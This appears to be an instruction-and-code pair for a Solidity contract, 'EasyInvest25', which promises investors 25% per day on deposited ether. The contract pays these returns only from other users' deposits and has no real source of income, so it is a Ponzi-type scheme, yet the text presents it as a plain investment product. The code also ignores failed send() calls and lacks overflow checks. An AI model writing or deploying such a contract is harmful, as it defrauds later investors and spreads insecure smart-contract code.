Code in Solidity that allows users to invest a certain amount of Ether and subsequently receive a percentage of their investment in the form of interest, with the interest amount calculated based on the block number and previous investments. The contract should keep track of the user's initial investment and the block number of each transaction. When a user invests, the contract should check if they have invested before. If they have, calculate the interest amount using the formula: (amount invested) x 25% x (blocks since last transaction) / 5900. Otherwise, the contract should update the user's invested amount and block number. When a user sends a transaction, the contract should call the interested function and send the calculated interest amount back to the sender.

```solidity
pragma solidity ^0.4.24;
contract EasyInvest25 {
    address owner;
    function EasyInvest25 () {
        owner = msg.sender;
    }
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;
    // this function called every time anyone sends a transaction to this contract
    function() external payable {
         // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0){
         // calculate profit amount as such:   
        address kashout = msg.sender;
        // amount = (amount invested) * 25% * (blocks since last transaction) / 5900
        // 5900 is an average block count per day produced by Ethereum blockchain
        uint256 getout = invested[msg.sender]*25/100*(block.number-atBlock[msg.sender])/5900;
        // send calculated amount of ether directly to sender (aka YOU)
        kashout.send(getout);
        }
        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}
